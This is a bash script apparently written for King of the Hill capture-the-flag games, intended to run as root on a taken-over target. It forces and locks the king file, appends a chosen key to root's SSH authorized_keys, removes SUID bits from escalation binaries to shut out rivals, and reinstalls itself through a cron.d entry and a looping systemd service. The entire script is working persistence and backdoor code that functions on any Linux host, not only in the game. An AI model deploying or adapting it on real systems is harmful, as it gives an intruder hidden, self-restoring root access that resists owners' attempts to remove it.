#!/usr/bin/env bash
# koth-guard.sh — target-side hold loop (run as root every 5 s + cron every min).
# Config: /etc/koth/guard.conf  (KING=..., PUBKEY='ssh-ed25519 ...')
set -u
CONF="${KOTH_GUARD_CONF:-/etc/koth/guard.conf}"
[ -r "$CONF" ] && . "$CONF"
KING="${KING:-}"
PUBKEY="${PUBKEY:-}"
KING_PATH="${KING_PATH:-/root/king.txt}"
AUTHORIZED_KEYS="${AUTHORIZED_KEYS:-/root/.ssh/authorized_keys}"
# Space-separated list of SUID binaries to de-escalate; override per host/OS.
SUID_STRIP="${SUID_STRIP:-/usr/bin/pkexec /usr/bin/screen-4.5.0 /usr/bin/screen /usr/bin/vim.basic /usr/bin/at /usr/bin/newuidmap /usr/bin/newgidmap}"
LOG_TAG="koth-guard"

log() { logger -t "$LOG_TAG" "$*" 2>/dev/null || true; }

# 1) king file: exact bytes, immutable where the filesystem supports it
if [ -n "$KING" ]; then
  cur=$(cat "$KING_PATH" 2>/dev/null || true)
  if [ "$cur" != "$KING" ]; then
    chattr -i "$KING_PATH" 2>/dev/null || true
    printf '%s' "$KING" > "$KING_PATH"
    chattr +i "$KING_PATH" 2>/dev/null || true
    log "king restored (was: $cur)"
  elif command -v lsattr >/dev/null 2>&1 && \
       ! lsattr "$KING_PATH" 2>/dev/null | grep -q '^....i'; then
    chattr +i "$KING_PATH" 2>/dev/null || true
    log "king re-immutabled"
  fi
fi

# 2) root SSH key
if [ -n "$PUBKEY" ]; then
  mkdir -p "$(dirname "$AUTHORIZED_KEYS")"; chmod 700 "$(dirname "$AUTHORIZED_KEYS")"
  touch "$AUTHORIZED_KEYS"; chmod 600 "$AUTHORIZED_KEYS"
  grep -qF "$(printf '%s' "$PUBKEY" | awk '{print $2}')" "$AUTHORIZED_KEYS" 2>/dev/null \
    || printf '%s\n' "$PUBKEY" >> "$AUTHORIZED_KEYS"
fi

# 3) close SUID escalators (re-applied if someone restores them)
for f in $SUID_STRIP; do
  [ -u "$f" ] && chmod -s "$f" 2>/dev/null
done

# 4) keep the guard itself installed (systemd if present, cron as fallback)
if [ ! -s /usr/local/sbin/koth-guard.sh ]; then
  cp "$0" /usr/local/sbin/koth-guard.sh 2>/dev/null && chmod 755 /usr/local/sbin/koth-guard.sh
fi
if [ -d /etc/cron.d ]; then
  [ -s /etc/cron.d/koth-guard ] || \
    printf '%s\n' '* * * * * root /bin/bash /usr/local/sbin/koth-guard.sh >/dev/null 2>&1' \
    > /etc/cron.d/koth-guard
fi
if command -v systemctl >/dev/null 2>&1; then
  [ -s /etc/systemd/system/koth-guard.service ] || {
    cat > /etc/systemd/system/koth-guard.service <<'UNIT'
[Unit]
Description=KotH king guard
After=network.target
[Service]
Type=simple
ExecStart=/bin/bash -c 'while true; do /bin/bash /usr/local/sbin/koth-guard.sh; sleep 5; done'
Restart=always
RestartSec=2
[Install]
WantedBy=multi-user.target
UNIT
    systemctl daemon-reload 2>/dev/null
    systemctl enable --now koth-guard.service 2>/dev/null
  }
fi
exit 0
